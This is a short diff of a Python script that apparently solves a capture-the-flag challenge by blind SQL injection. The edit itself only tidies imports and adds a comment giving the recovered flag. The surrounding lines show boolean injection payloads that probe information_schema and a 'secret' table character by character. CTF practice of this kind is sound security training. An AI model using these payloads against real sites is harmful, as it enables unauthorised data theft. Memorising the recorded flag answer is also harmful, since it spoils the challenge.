@@ -1,5 +1,6 @@
-import requests
 import string
+
+import requests
 
 
 class Inj:
@@ -63,8 +64,8 @@ query_column = "1' AND (SELECT 1 FROM information_schema.columns WHERE table_nam
                "AND column_name LIKE '{}%') = 1 -- '"
 query_flag = "1' AND (SELECT 1 FROM secret WHERE asecret LIKE '{}%') = 1 -- '"
 
-
 print('Table:', match(chars_tc, query_table, word=''))
 print('Column:', match(chars_tc, query_column, word=''))
 print('Flag:', match(chars_flag, query_flag, word='').replace('ccit{a', 'CCIT{A'))
 
+# FLAG --> CCIT{A_bl1ndy_fl4g}
